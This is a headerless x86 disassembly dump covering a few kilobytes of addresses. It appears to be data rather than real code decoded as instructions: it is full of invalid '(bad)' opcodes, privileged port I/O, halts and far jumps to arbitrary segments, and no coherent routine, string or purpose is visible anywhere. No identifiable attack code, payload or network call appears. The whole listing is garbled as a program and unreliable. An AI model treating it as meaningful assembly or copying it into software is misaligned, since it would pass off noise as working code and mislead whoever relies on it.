  41a3c2:	test   eax,0xa8893dd
  41a3c7:	mov    WORD PTR [edx],gs
  41a3c9:	les    edx,FWORD PTR [eax+0x25]
  41a3cc:	xchg   ecx,eax
  41a3cd:	inc    ebp
  41a3ce:	cld    
  41a3cf:	hlt    
  41a3d0:	sbb    eax,0x63dbb19d
  41a3d5:	jbe    0x41a3ff
  41a3d7:	dec    esp
  41a3d8:	pop    ecx
  41a3d9:	fnstcw WORD PTR [edx-0x4f85ec7c]
  41a3df:	jae    0x41a426
  41a3e1:	sub    eax,0xa8080e02
  41a3e6:	sbb    dh,0xd2
  41a3e9:	or     edi,DWORD PTR [ebp+esi*8-0x743cd70c]
  41a3f0:	test   al,0xec
  41a3f2:	xchg   esi,eax
  41a3f3:	adc    edx,DWORD PTR [ebp+0x48]
  41a3f6:	dec    esp
  41a3f7:	fist   WORD PTR ds:0xd9678df7
  41a3fd:	add    BYTE PTR [eax+0x7cf70e1],ch
  41a403:	mov    DWORD PTR [eax+eax*8],edi
  41a406:	xchg   bl,bh
  41a408:	sbb    al,0xa4
  41a40a:	pop    eax
  41a40b:	adc    eax,0x9e9ae122
  41a410:	test   al,0x55
  41a412:	jl     0x41a41c
  41a414:	adc    al,0xe
  41a416:	sbb    esp,DWORD PTR [edi+eax*4-0x60]
  41a41a:	out    0xba,al
  41a41c:	push   ecx
  41a41d:	stos   BYTE PTR es:[edi],al
  41a41e:	pop    eax
  41a41f:	xchg   ecx,eax
  41a420:	ss jmp 0x39e86ae7
  41a426:	cs push esp
  41a428:	gs push ebx
  41a42a:	sub    eax,0xc448767d
  41a42f:	mov    al,0xd7
  41a431:	and    BYTE PTR [edi+0x205e708c],ah
  41a437:	sbb    DWORD PTR [esi+0x3f0a525f],esi
  41a43d:	xchg   edx,eax
  41a43e:	mov    BYTE PTR [ebx+eiz*8+0x59],cl
  41a442:	mov    DWORD PTR [ebx],edi
  41a444:	out    dx,al
  41a445:	push   edi
  41a446:	jmp    0xa68d:0x7de034fe
  41a44d:	hlt    
  41a44e:	pop    ecx
  41a44f:	jmp    0x3ba9:0xde259deb
  41a456:	dec    ecx
  41a457:	addr16 sub bh,0xd0
  41a45b:	dec    ebp
  41a45c:	mov    esi,0xa8c2e6ca
  41a461:	jns    0x41a40e
  41a463:	mov    al,0xcb
  41a465:	pop    ecx
  41a466:	je     0x41a43c
  41a468:	dec    eax
  41a469:	and    edx,edi
  41a46b:	addr16 mov ds:0x4f1a,eax
  41a46f:	cmp    BYTE PTR [esi],0xf5
  41a472:	mov    ds:0x32278dc,al
  41a477:	jp     0x41a4d7
  41a479:	and    DWORD PTR [ebp-0x56af244c],eax
  41a47f:	sbb    BYTE PTR ds:0x1465fe05,dl
  41a485:	lods   al,BYTE PTR ds:[esi]
  41a486:	retf   
  41a487:	hlt    
  41a488:	sbb    dh,BYTE PTR [edx+0x780c8052]
  41a48e:	shr    DWORD PTR [edi],cl
  41a490:	ins    DWORD PTR es:[edi],dx
  41a491:	or     esp,ecx
  41a493:	inc    edx
  41a494:	inc    esp
  41a495:	(bad)  [ecx]
  41a497:	(bad)  
  41a498:	jp     0x41a4e4
  41a49a:	xchg   edx,eax
  41a49b:	or     al,0xc
  41a49d:	fild   DWORD PTR [edi+0x2b]
  41a4a0:	cdq    
  41a4a1:	mov    bl,0x6
  41a4a3:	mov    ch,ch
  41a4a5:	loope  0x41a50e
  41a4a7:	shl    ebx,1
  41a4a9:	iret   
  41a4aa:	pop    es
  41a4ab:	idiv   ch
  41a4ad:	les    edx,FWORD PTR [ebp+0x77]
  41a4b0:	push   edi
  41a4b1:	adc    DWORD PTR [ecx+ebx*8+0x50],ebx
  41a4b5:	inc    esi
  41a4b6:	adc    dl,BYTE PTR [edi+0x61f8c10a]
  41a4bc:	sub    ebx,DWORD PTR ds:0x322ed8e7
  41a4c2:	add    ah,dh
  41a4c4:	shl    BYTE PTR [ebp+0x25a82c44],1
  41a4ca:	shr    BYTE PTR [esi-0x33232074],0xcc
  41a4d1:	cli    
  41a4d2:	xor    al,0x42
  41a4d4:	cmp    ah,BYTE PTR [ebx]
  41a4d6:	cs das 
  41a4d8:	sbb    eax,0x11d3b763
  41a4dd:	push   dx
  41a4df:	addr16 lahf 
  41a4e1:	mov    ecx,0xcb880360
  41a4e6:	fadd   DWORD PTR [esi-0x48]
  41a4e9:	test   al,0x59
  41a4eb:	sub    al,0x42
  41a4ed:	call   0x30140373
  41a4f2:	imul   edi,eax,0xffffffdb
  41a4f5:	fsubr  st(1),st
  41a4f7:	or     eax,0x7d4a96c2
  41a4fc:	push   eax
  41a4fd:	cdq    
  41a4fe:	push   esp
  41a4ff:	loope  0x41a4e5
  41a501:	ret    0xc093
  41a504:	(bad)  
  41a506:	popa   
  41a507:	mov    esi,0x98d4939f
  41a50c:	jp     0x41a4c6
  41a50e:	and    BYTE PTR [eax],0xbb
  41a511:	sahf   
  41a512:	xor    eax,ebx
  41a514:	pop    esp
  41a515:	push   edx
  41a516:	sbb    DWORD PTR cs:[edi-0x69],edx
  41a51a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a51b:	or     cl,BYTE PTR [ebp+eiz*8-0x40]
  41a51f:	jmp    0xbdd6:0x8f254051
  41a526:	test   eax,0x8b9e7685
  41a52b:	shr    ebp,0xad
  41a52e:	icebp  
  41a52f:	jnp    0x41a50c
  41a531:	call   0x5922c7e9
  41a536:	adc    BYTE PTR [edi+0x52],al
  41a539:	sbb    BYTE PTR [ecx+0x54dfb222],dh
  41a53f:	mov    ebp,0xd6dd29cd
  41a544:	xor    al,bl
  41a546:	inc    esi
  41a547:	out    dx,eax
  41a548:	ins    BYTE PTR es:[edi],dx
  41a549:	call   0x201ff2a0
  41a54e:	sahf   
  41a54f:	fidiv  DWORD PTR [esi+ecx*1]
  41a552:	pop    es
  41a553:	test   al,0x88
  41a555:	cmp    al,0x3e
  41a557:	jge    0x41a5c3
  41a559:	xor    bh,BYTE PTR [esp+eax*8]
  41a55c:	xlat   BYTE PTR ds:[ebx]
  41a55d:	push   0xffffffc0
  41a55f:	arpl   WORD PTR [esi-0x25],di
  41a562:	cwde   
  41a563:	leave  
  41a564:	jne    0x41a574
  41a566:	stos   DWORD PTR es:[edi],eax
  41a567:	jbe    0x41a506
  41a569:	xchg   edi,eax
  41a56a:	push   edi
  41a56b:	push   esp
  41a56c:	fisttp QWORD PTR [edi-0x697104c5]
  41a572:	in     al,0x36
  41a574:	addr16 pusha 
  41a576:	inc    esi
  41a577:	pop    esp
  41a578:	fild   DWORD PTR [edi-0x65e9517f]
  41a57e:	xor    BYTE PTR [ecx],0x74
  41a581:	in     al,dx
  41a582:	sub    al,0xc4
  41a584:	retf   0xab79
  41a587:	cmp    DWORD PTR [ebx+edi*1],esp
  41a58a:	(bad)  
  41a58b:	sub    edx,edx
  41a58d:	push   ebp
  41a58e:	and    eax,0x81781a7d
  41a593:	aaa    
  41a594:	xchg   esi,eax
  41a595:	dec    esi
  41a596:	push   es
  41a597:	int3   
  41a598:	mov    ds:0xb7ab9e38,al
  41a59d:	inc    ebp
  41a59e:	jg     0x41a5e5
  41a5a0:	cld    
  41a5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5a2:	adc    esi,edi
  41a5a4:	shr    BYTE PTR [esi+edi*1-0x29d6d4fc],0x62
  41a5ac:	not    DWORD PTR [ecx+edx*4-0x11]
  41a5b0:	dec    eax
  41a5b1:	xor    esp,esi
  41a5b3:	lds    esi,FWORD PTR [edx]
  41a5b5:	lods   eax,DWORD PTR ds:[esi]
  41a5b6:	fxch   st(3)
  41a5b8:	call   0xeb988212
  41a5bd:	lea    edi,[ecx+eiz*1]
  41a5c0:	push   esp
  41a5c1:	pushf  
  41a5c2:	xchg   esp,eax
  41a5c3:	imul   BYTE PTR [ebp*8+0x67ced611]
  41a5ca:	test   eax,0xb2ba2ac1
  41a5cf:	push   eax
  41a5d0:	lods   al,BYTE PTR ds:[esi]
  41a5d1:	test   al,0xd4
  41a5d3:	and    eax,0x9537a88d
  41a5d8:	stc    
  41a5d9:	pop    ebx
  41a5da:	push   ss
  41a5db:	outs   dx,BYTE PTR ds:[esi]
  41a5dc:	inc    ecx
  41a5dd:	pop    esp
  41a5de:	xor    al,al
  41a5e0:	cmp    edx,esp
  41a5e2:	cmp    BYTE PTR [esi],cl
  41a5e4:	adc    BYTE PTR [esi+ebx*1],bh
  41a5e7:	xlat   BYTE PTR ds:[ebx]
  41a5e8:	push   ss
  41a5e9:	jb     0x41a63c
  41a5eb:	or     eax,0xe782eee2
  41a5f0:	pop    edi
  41a5f1:	xchg   ecx,eax
  41a5f2:	lea    edi,[eax+edi*4-0xb]
  41a5f6:	mov    ebp,0x73abaa3e
  41a5fb:	fs dec ecx
  41a5fd:	jo     0x41a590
  41a5ff:	clc    
  41a600:	stos   DWORD PTR es:[edi],eax
  41a601:	out    dx,eax
  41a602:	or     eax,0x78d9983f
  41a607:	xchg   esi,eax
  41a608:	sub    al,BYTE PTR [esp+ecx*4]
  41a60b:	sub    al,0x19
  41a60d:	ins    DWORD PTR es:[edi],dx
  41a60e:	mul    BYTE PTR [ebx-0x2e]
  41a611:	dec    ecx
  41a612:	xor    ebp,DWORD PTR [ebp+0x1]
  41a615:	sbb    BYTE PTR [edx],ch
  41a617:	jns    0x41a642
  41a619:	loop   0x41a698
  41a61b:	mov    eax,ds:0xfa5cb1fb
  41a620:	aaa    
  41a621:	sub    cl,al
  41a623:	je     0x41a5f2
  41a625:	sbb    esp,DWORD PTR [ebp+0x50]
  41a628:	stos   DWORD PTR es:[edi],eax
  41a629:	data16 shl ch,0x25
  41a62d:	inc    edx
  41a62e:	push   0x1c5db3c4
  41a633:	adc    ah,BYTE PTR [ebx-0x5954881]
  41a639:	stc    
  41a63a:	ret    0x44c
  41a63d:	mov    edx,0x567149fa
  41a643:	dec    edx
  41a644:	fsubr  st(7),st
  41a646:	sbb    BYTE PTR [esi+ebp*1],0x2f
  41a64a:	dec    eax
  41a64b:	imul   edx,DWORD PTR [ebp-0x5c],0x6ed64a03
  41a652:	pop    edi
  41a653:	adc    DWORD PTR [ecx],esp
  41a655:	and    al,0xd4
  41a657:	aaa    
  41a658:	mov    al,ds:0x795f16d
  41a65d:	sbb    bl,bl
  41a65f:	pop    edx
  41a660:	mov    ds:0x6d85bfd0,al
  41a665:	jmp    0x2811eb71
  41a66a:	fnstenv [edi+0x1daeca1b]
  41a670:	xor    al,0x77
  41a672:	pop    edx
  41a673:	xor    eax,0xe5796bd6
  41a678:	es mov al,0x4
  41a67b:	mov    ebp,0x30dcaf6b
  41a680:	push   ebp
  41a681:	iret   
  41a682:	fwait
  41a683:	or     BYTE PTR [ebx-0x2c6fc384],bl
  41a689:	dec    ecx
  41a68a:	sub    BYTE PTR [edi+0x65],0x20
  41a68e:	xchg   esi,eax
  41a68f:	hlt    
  41a690:	or     DWORD PTR ds:0x6414270c,eax
  41a696:	jo     0x41a69b
  41a698:	inc    esp
  41a699:	into   
  41a69a:	mov    edx,0x8877f320
  41a69f:	mov    edx,0x806098ba
  41a6a4:	addr16 jmp 0x41a62e
  41a6a7:	xor    BYTE PTR [esi],dl
  41a6a9:	dec    edx
  41a6aa:	js     0x41a644
  41a6ac:	pop    ecx
  41a6ad:	inc    esp
  41a6ae:	dec    ecx
  41a6af:	jb     0x41a671
  41a6b1:	arpl   WORD PTR [eax],ax
  41a6b3:	pop    ebp
  41a6b4:	fwait
  41a6b5:	mov    edi,0x277fbbe3
  41a6ba:	rol    DWORD PTR [ebx+0x227469fe],0x2c
  41a6c1:	shr    BYTE PTR [ebx+0x9a0cbd1],cl
  41a6c7:	pop    ebx
  41a6c8:	(bad)  
  41a6c9:	mov    edi,0x3c8f7125
  41a6ce:	stc    
  41a6cf:	rcl    DWORD PTR [edx-0x64],cl
  41a6d2:	in     eax,0x7f
  41a6d4:	add    al,0xf0
  41a6d6:	jnp    0x41a6c4
  41a6d8:	in     al,0xed
  41a6da:	rcl    DWORD PTR [ecx-0x4a],0xa5
  41a6de:	lods   eax,DWORD PTR ds:[esi]
  41a6df:	dec    edi
  41a6e0:	gs aam 0xac
  41a6e3:	and    eax,0x1909577d
  41a6e8:	push   esi
  41a6e9:	loope  0x41a684
  41a6eb:	(bad)  [esi]
  41a6ed:	mov    ebx,0xf90d33bb
  41a6f2:	push   0x763f4eb5
  41a6f7:	cdq    
  41a6f8:	sub    al,0x4e
  41a6fa:	jp     0x41a6bf
  41a6fc:	mov    ecx,0xaf57af1f
  41a701:	jbe    0x41a69c
  41a703:	sub    eax,0x1c3fd2d0
  41a708:	mov    eax,ds:0xff112227
  41a70d:	call   0x76c3b011
  41a712:	fs mov edi,0x48906671
  41a718:	xchg   esp,eax
  41a719:	jl     0x41a6e9
  41a71b:	addr16 test eax,0x43324858
  41a721:	rcl    DWORD PTR [eax-0x74],0xcc
  41a725:	mov    ds:0xa332d3b8,eax
  41a72a:	sub    eax,0x941124d7
  41a72f:	pop    edi
  41a730:	shl    DWORD PTR [ebp+edx*1-0x64c25d7],cl
  41a737:	push   es
  41a738:	mov    edx,0x6a71c492
  41a73d:	sub    BYTE PTR [ecx-0x8],ch
  41a740:	test   eax,0xd2534795
  41a745:	xchg   ebp,eax
  41a746:	dec    ebx
  41a747:	(bad)  
  41a748:	lods   al,BYTE PTR ds:[esi]
  41a749:	mov    edx,0x55582cb1
  41a74e:	jge    0x41a75b
  41a750:	call   0x18483b06
  41a755:	in     eax,0xdd
  41a757:	fucomp st(4)
  41a759:	ja     0x41a702
  41a75b:	(bad)  
  41a75c:	ins    BYTE PTR es:[edi],dx
  41a75d:	sub    ah,dh
  41a75f:	rcl    BYTE PTR [eax+eiz*1],cl
  41a762:	inc    eax
  41a763:	sub    ch,BYTE PTR [edi+eiz*4-0x50d58a2a]
  41a76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a76b:	mov    edi,0xb4ec6bdd
  41a770:	dec    ebx
  41a771:	adc    BYTE PTR [ecx],0xcf
  41a774:	gs inc ebx
  41a776:	iret   
  41a777:	add    al,0xdb
  41a77a:	ret    0x5a95
  41a77d:	push   cs
  41a77e:	ss out 0x9b,al
  41a781:	cmp    BYTE PTR [ebx-0x33],cl
  41a784:	nop
  41a785:	cli    
  41a786:	cmp    ebp,DWORD PTR [edx-0x4d]
  41a789:	jmp    ebp
  41a78b:	inc    ebp
  41a78c:	push   eax
  41a78d:	scas   eax,DWORD PTR es:[edi]
  41a78e:	mov    ecx,0xf2ef9a75
  41a793:	mov    edi,0xc4dce739
  41a798:	add    eax,0xe2a3a4
  41a79d:	xor    eax,0xd037323d
  41a7a2:	imul   esp,eax,0xffffffbc
  41a7a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a6:	add    al,0xff
  41a7a8:	in     eax,dx
  41a7a9:	call   0xf9e7618c
  41a7ae:	sbb    eax,0x4eee952d
  41a7b3:	fadd   DWORD PTR [esi]
  41a7b5:	(bad)  
  41a7b6:	xor    eax,DWORD PTR [esi+eax*2-0x27ad5420]
  41a7bd:	push   eax
  41a7be:	repz loope 0x41a80d
  41a7c1:	ins    BYTE PTR es:[edi],dx
  41a7c2:	push   esp
  41a7c3:	jge    0x41a842
  41a7c5:	add    bl,bl
  41a7c7:	div    BYTE PTR [ecx-0x46ad5579]
  41a7cd:	imul   BYTE PTR ds:0x7244e6ba
  41a7d3:	push   edx
  41a7d4:	or     cl,cl
  41a7d6:	pop    es
  41a7d7:	pop    ebx
  41a7d8:	scas   eax,DWORD PTR es:[edi]
  41a7d9:	sahf   
  41a7da:	loop   0x41a845
  41a7dc:	xor    al,0xce
  41a7de:	pop    ds
  41a7df:	cld    
  41a7e0:	push   ebp
  41a7e1:	call   0xe104:0xcd3e843e
  41a7e8:	outs   dx,BYTE PTR ds:[esi]
  41a7e9:	shl    cl,1
  41a7eb:	dec    eax
  41a7ec:	add    al,0x6d
  41a7ee:	jae    0x41a7a9
  41a7f0:	sbb    al,0x42
  41a7f2:	loop   0x41a827
  41a7f4:	or     BYTE PTR [eax],cl
  41a7f6:	lahf   
  41a7f7:	cmp    DWORD PTR [edi+0x21adaa77],esi
  41a7fd:	push   ecx
  41a7fe:	push   ds
  41a7ff:	ret    
  41a800:	inc    eax
  41a801:	les    ebp,FWORD PTR [ecx-0x4d]
  41a804:	dec    esi
  41a805:	leave  
  41a806:	mov    dl,0xc3
  41a808:	ja     0x41a7ab
  41a80a:	in     al,0x77
  41a80c:	pop    ds
  41a80d:	cwde   
  41a80e:	stc    
  41a80f:	lea    ecx,[ebx+ecx*1]
  41a812:	or     esp,DWORD PTR [ecx-0x2a]
  41a815:	jnp    0x41a802
  41a817:	sbb    DWORD PTR [edi+eiz*2-0xf],0xfffffff9
  41a81c:	xchg   esp,eax
  41a81d:	adc    bh,0xdd
  41a820:	(bad)  
  41a821:	adc    al,0x25
  41a823:	push   0xa111a4e7
  41a828:	and    DWORD PTR [edx+0x67793865],esp
  41a82e:	push   ss
  41a82f:	mov    fs,esi
  41a831:	add    BYTE PTR [edx+0x3],0xc8
  41a835:	dec    esp
  41a836:	push   0xffffff90
  41a838:	ins    DWORD PTR es:[edi],dx
  41a839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a83a:	push   edx
  41a83b:	bound  ebp,QWORD PTR [eax]
  41a83d:	call   DWORD PTR [eax]
  41a83f:	outs   dx,BYTE PTR ds:[esi]
  41a840:	pop    es
  41a841:	pushf  
  41a842:	sbb    BYTE PTR [edi+0x14],al
  41a845:	sub    eax,eax
  41a847:	or     DWORD PTR [ecx+0x4910732e],ebx
  41a84d:	loope  0x41a828
  41a84f:	dec    eax
  41a850:	mov    ch,0xc2
  41a852:	stos   BYTE PTR es:[edi],al
  41a853:	shl    DWORD PTR [esi+0x1b],cl
  41a856:	pop    esp
  41a857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a858:	mov    eax,ds:0x2ca3f221
  41a85d:	xlat   BYTE PTR ds:[ebx]
  41a85e:	jp     0x41a82f
  41a860:	jg     0x41a844
  41a862:	adc    DWORD PTR [ecx+0x6f],0x78
  41a866:	mov    ds:0x13dcc049,al
  41a86b:	ins    BYTE PTR es:[edi],dx
  41a86c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a86d:	loopne 0x41a8dc
  41a86f:	xor    eax,0x8594836b
  41a874:	pop    esp
  41a875:	xchg   ecx,eax
  41a876:	or     BYTE PTR [ebp+0x12],0xa4
  41a87a:	and    BYTE PTR [edx-0x3a],dh
  41a87d:	cdq    
  41a87e:	mov    cl,0xc2
  41a880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a881:	(bad)  
  41a882:	mov    bl,0x96
  41a884:	mov    ebx,DWORD PTR [esi]
  41a886:	dec    edi
  41a887:	dec    esp
  41a888:	jge    0x41a81c
  41a88a:	imul   eax
  41a88c:	not    DWORD PTR [ebx-0x38f1de7c]
  41a892:	lock (bad) 
  41a894:	adc    ecx,esp
  41a896:	and    cl,0x3b
  41a899:	push   ebp
  41a89a:	lock jns 0x41a91a
  41a89d:	lods   eax,DWORD PTR ds:[esi]
  41a89e:	xchg   DWORD PTR [esp+eax*4-0x189855a0],edi
  41a8a5:	mov    dl,0x92
  41a8a7:	inc    ecx
  41a8a8:	iret   
  41a8a9:	mov    esp,DWORD PTR [ebp+esi*1+0x48]
  41a8ad:	pop    edi
  41a8ae:	jecxz  0x41a84c
  41a8b0:	sbb    DWORD PTR [esp+ecx*4+0x14ce232],0xffffffe5
  41a8b8:	push   0xffffffaa
  41a8ba:	pop    esp
  41a8bb:	test   al,0x34
  41a8bd:	add    cl,BYTE PTR [edx-0x6b]
  41a8c0:	cwde   
  41a8c1:	pop    ds
  41a8c2:	and    bl,0x94
  41a8c5:	pop    esi
  41a8c6:	out    0xd2,al
  41a8c8:	xchg   esi,eax
  41a8c9:	push   ecx
  41a8ca:	or     eax,0xa28cf876
  41a8cf:	add    ch,cl
  41a8d1:	jmp    0x1f3f:0xd255405a
  41a8d8:	mov    ds:0x3f7a880,eax
  41a8dd:	ins    DWORD PTR es:[edi],dx
  41a8de:	push   esp
  41a8df:	jns    0x41a93d
  41a8e1:	xchg   edx,eax
  41a8e2:	ret    0xe689
  41a8e5:	ret    0x31a
  41a8e8:	sub    al,0x5e
  41a8ea:	mov    bl,BYTE PTR [edi]
  41a8ec:	popa   
  41a8ed:	push   edi
  41a8ee:	push   esp
  41a8ef:	jno    0x41a950
  41a8f1:	sbb    cl,BYTE PTR [esi]
  41a8f3:	vpsubusb xmm2,xmm7,XMMWORD PTR es:[ebp-0x43]
  41a8f9:	stos   DWORD PTR es:[edi],eax
  41a8fa:	lahf   
  41a8fb:	and    al,0x9f
  41a8fd:	jns    0x41a89d
  41a8ff:	adc    al,0xaa
  41a901:	and    eax,DWORD PTR [esi-0x376395df]
  41a907:	enter  0x5daa,0xf3
  41a90b:	out    0xdd,al
  41a90d:	mov    eax,0x191b39b6
  41a912:	add    al,0x4b
  41a914:	into   
  41a915:	push   0x1f
  41a917:	clc    
  41a918:	jle    0x41a978
  41a91a:	fstp   TBYTE PTR [ebx+0x5b]
  41a91d:	mov    bh,0x7b
  41a91f:	xor    BYTE PTR [edx],dh
  41a921:	imul   edx,esi,0x46
  41a924:	xchg   ecx,eax
  41a925:	loopne 0x41a942
  41a927:	mov    al,ds:0xd96bc4a1
  41a92c:	xor    esp,DWORD PTR [eax+0x11]
  41a92f:	repnz imul esp,DWORD PTR [edi],0x14
  41a933:	inc    ebx
  41a934:	mov    esp,0x2ec1f373
  41a939:	or     dl,BYTE PTR [esi+ebp*2]
  41a93c:	jae    0x41a8e6
  41a93e:	in     al,dx
  41a93f:	ins    BYTE PTR es:[edi],dx
  41a940:	popf   
  41a941:	arpl   WORD PTR [esp+eiz*2+0x45772afd],bp
  41a948:	xor    al,0xb7
  41a94a:	inc    edx
  41a94b:	xor    edi,DWORD PTR [eax+0x4ad872dd]
  41a951:	mov    ebx,0xbc749981
  41a956:	pop    ss
  41a957:	(bad)  
  41a958:	jge    0x41a991
  41a95a:	adc    al,0xad
  41a95c:	mov    ebp,0x664f998
  41a961:	scas   al,BYTE PTR es:[edi]
  41a962:	fbld   TBYTE PTR [esi-0x7]
  41a965:	inc    edx
  41a966:	inc    edi
  41a967:	and    al,0xbe
  41a969:	sbb    eax,0xcc746200
  41a96e:	add    eax,0x974dc4fa
  41a973:	int    0xa3
  41a975:	mov    ds:0x72716d92,eax
  41a97a:	mul    DWORD PTR [edi+ecx*8]
  41a97d:	lock ss aas 
  41a980:	adc    ecx,esp
  41a982:	xchg   ebx,eax
  41a983:	in     eax,0x66
  41a985:	dec    edx
  41a986:	iret   
  41a987:	push   ss
  41a988:	adc    al,0x79
  41a98a:	out    0x68,eax
  41a98c:	or     edi,DWORD PTR [ebp+0x4e507e34]
  41a992:	sub    bh,BYTE PTR [edi]
  41a994:	frstor [ecx]
  41a996:	repz pushf 
  41a998:	pushf  
  41a999:	icebp  
  41a99a:	pushw  es
  41a99c:	push   0x19
  41a99e:	clc    
  41a99f:	dec    edx
  41a9a0:	dec    eax
  41a9a1:	and    DWORD PTR [eax+ebp*2-0x62e46be9],ecx
  41a9a8:	jmp    0x535c9b7
  41a9ad:	xchg   ebp,eax
  41a9ae:	sub    BYTE PTR [ebp+0x7a],cl
  41a9b1:	pusha  
  41a9b2:	jmp    0x41a937
  41a9b4:	push   edi
  41a9b5:	mov    DWORD PTR [esi],edi
  41a9b7:	mov    edx,esi
  41a9b9:	shl    BYTE PTR [edi-0x6f],cl
  41a9bc:	pop    ds
  41a9bd:	mov    cl,0x80
  41a9bf:	inc    ebp
  41a9c0:	jne    0x41a979
  41a9c2:	ror    BYTE PTR [ecx-0x6bb65861],cl
  41a9c8:	mov    ds:0x7df15172,al
  41a9cd:	xchg   ecx,eax
  41a9ce:	leave  
  41a9cf:	in     eax,dx
  41a9d0:	add    BYTE PTR ds:[esi+ebp*2-0x28],cl
  41a9d5:	mov    ebp,0x4d75e2a2
  41a9da:	xchg   DWORD PTR [esi],edx
  41a9dc:	jb     0x41aa0e
  41a9de:	cmp    eax,0xd0bcddaa
  41a9e3:	push   edx
  41a9e4:	cmp    esp,0x4a
  41a9e7:	mov    ebp,0xa584a857
  41a9ec:	xor    al,BYTE PTR ds:0x1401de09
  41a9f2:	mov    dl,0x5d
  41a9f4:	push   ebp
  41a9f5:	sub    esi,DWORD PTR ds:0x97483ec3
  41a9fb:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41a9fd:	xchg   esp,eax
  41a9fe:	bound  ebx,QWORD PTR [esi]
  41aa00:	je     0x41aa0d
  41aa02:	pusha  
  41aa03:	xor    ebx,DWORD PTR [eax]
  41aa05:	jg     0x41a98b
  41aa07:	or     DWORD PTR [ebp-0x27],0x5b
  41aa0b:	push   edx
  41aa0c:	in     al,0xe
  41aa0e:	and    eax,0xb708008a
  41aa13:	ins    BYTE PTR es:[edi],dx
  41aa14:	push   cs
  41aa15:	and    bl,dh
  41aa17:	addr16 pop es
  41aa19:	pop    edx
  41aa1a:	aas    
  41aa1b:	leave  
  41aa1c:	pop    edi
  41aa1d:	test   eax,0x98e71b47
  41aa22:	(bad)  
  41aa23:	mov    ch,0x54
  41aa25:	lods   al,BYTE PTR ds:[esi]
  41aa26:	test   al,0x9d
  41aa28:	test   bl,bl
  41aa2a:	test   al,0x60
  41aa2c:	ja     0x41aa72
  41aa2e:	mov    esi,0xe1b434eb
  41aa33:	sti    
  41aa34:	outs   dx,DWORD PTR ds:[esi]
  41aa35:	mov    ecx,0xe04aa0bd
  41aa3a:	ffreep st(5)
  41aa3c:	cld    
  41aa3d:	shl    DWORD PTR ss:[ebx],0xf2
  41aa41:	or     al,0x98
  41aa43:	ret    0xbe78
  41aa46:	push   edx
  41aa47:	dec    eax
  41aa48:	dec    edx
  41aa49:	cmp    DWORD PTR [ecx+0x543771b9],edx
  41aa4f:	stos   BYTE PTR es:[edi],al
  41aa50:	shl    DWORD PTR [esi+edx*8-0x137acd7c],1
  41aa57:	sbb    DWORD PTR [ecx-0x530c8c8c],ebp
  41aa5d:	jmp    0xc64f01ff
  41aa62:	or     BYTE PTR [edi],0x67
  41aa65:	and    bl,BYTE PTR [esi]
  41aa67:	xor    BYTE PTR [edi-0xf047723],ah
  41aa6d:	inc    edx
  41aa6e:	xchg   edx,eax
  41aa6f:	or     DWORD PTR [ebp-0x7551953b],ebp
  41aa75:	add    al,0x6e
  41aa77:	or     eax,0x1586fe4c
  41aa7c:	jmp    0x41aaad
  41aa7e:	mov    ecx,0xf3789dae
  41aa83:	in     al,0x9d
  41aa85:	mov    ebp,0xb2e9c39
  41aa8a:	clc    
  41aa8b:	pop    ebp
  41aa8c:	pushf  
  41aa8d:	add    DWORD PTR ss:[eax+eax*8+0x3c],esp
  41aa92:	mov    esp,0xee37d8de
  41aa97:	mov    bh,0x81
  41aa99:	das    
  41aa9a:	inc    BYTE PTR [edx]
  41aa9c:	fld    QWORD PTR [ebx]
  41aa9e:	mov    al,ds:0x68a1135f
  41aaa3:	adc    esi,eax
  41aaa5:	pop    eax
  41aaa6:	xor    DWORD PTR [ecx-0x7b],ebp
  41aaa9:	xchg   bh,cl
  41aaab:	push   cs
  41aaac:	sbb    esi,DWORD PTR [esp+edx*4]
  41aaaf:	jecxz  0x41aaee
  41aab1:	sbb    edx,eax
  41aab3:	int3   
  41aab4:	sbb    esp,ecx
  41aab6:	xchg   ebp,eax
  41aab7:	inc    esp
  41aab8:	inc    eax
  41aab9:	inc    esp
  41aaba:	fmul   QWORD PTR [ecx+0x2ac6b903]
  41aac0:	xchg   DWORD PTR [esi],esp
  41aac2:	jmp    0xbfd5e94a
  41aac7:	idiv   bl
  41aac9:	cmp    ch,BYTE PTR [ecx-0x77]
  41aacc:	dec    edi
  41aacd:	enter  0xa759,0x2e
  41aad1:	xchg   edx,eax
  41aad2:	sub    eax,0x2e87f2d8
  41aad7:	retf   
  41aad8:	cdq    
  41aad9:	ficom  WORD PTR [ebp+0x67]
  41aadc:	sub    bl,0x78
  41aadf:	ret    
  41aae0:	fsub   DWORD PTR [eax]
  41aae2:	inc    ebp
  41aae3:	pop    ss
  41aae4:	lods   eax,DWORD PTR ds:[esi]
  41aae5:	cmp    al,0x1d
  41aae7:	push   edx
  41aae8:	mov    ebp,0x17cb1e3b
  41aaed:	xchg   ebp,eax
  41aaee:	je     0x41aab4
  41aaf0:	popf   
  41aaf1:	mov    WORD PTR [ebx+0x39],ds
  41aaf4:	ins    BYTE PTR es:[edi],dx
  41aaf5:	push   eax
  41aaf6:	out    0x81,eax
  41aaf8:	pop    edi
  41aaf9:	cwde   
  41aafa:	push   edi
  41aafb:	and    edx,DWORD PTR [edi-0x9]
  41aafe:	pop    ebx
  41aaff:	sbb    BYTE PTR [edx+0x1840f81c],bl
  41ab05:	dec    esp
  41ab06:	add    eax,0x51698c74
  41ab0b:	cld    
  41ab0c:	loope  0x41ab2c
  41ab0e:	mov    ebx,0xd0ce3fa5
  41ab13:	sub    BYTE PTR [edx-0x58b96c77],bl
  41ab19:	ret    0xf86d
  41ab1c:	dec    ebx
  41ab1d:	lods   al,BYTE PTR ds:[esi]
  41ab1e:	push   ebx
  41ab1f:	inc    ebp
  41ab20:	jo     0x41ab51
  41ab22:	pop    es
  41ab23:	ins    BYTE PTR es:[edi],dx
  41ab24:	xchg   ecx,esp
  41ab26:	sti    
  41ab27:	std    
  41ab28:	pop    edx
  41ab29:	mov    dl,0x1d
  41ab2b:	sti    
  41ab2c:	push   es
  41ab2d:	jnp    0x41ab12
  41ab2f:	pop    ss
  41ab30:	sub    edx,DWORD PTR [ebp-0x56]
